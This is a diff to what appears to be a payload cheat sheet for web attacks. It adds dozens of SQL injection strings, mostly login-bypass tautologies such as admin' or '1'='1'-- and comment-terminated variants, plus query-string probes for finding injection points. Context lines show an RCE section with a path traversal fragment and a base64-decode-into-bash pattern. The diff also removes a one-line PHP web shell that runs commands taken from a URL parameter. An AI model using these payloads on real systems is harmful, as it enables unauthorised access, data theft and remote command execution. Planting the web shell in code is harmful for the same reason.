@@ -7,7 +7,46 @@ XSS:
 SQL Injection:
 OR 1=1
 'OR'1'='1
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or 1=1--
+or true--
+" or true--
+' or true--
+")or true--
+') or true--
+' or 'x'='x
+) or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1''asd'' 
 Admin'+OR+1=1%23
+' OORR 1<2 #
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
 
 RCE (Remote Code Execution):
 ....//
@@ -22,5 +61,3 @@ echo ... | base64 -d | bash
 /{victim-id}/activity/attachments/
 
 
-php:
-<?php system($_GET['cmd']); ?>
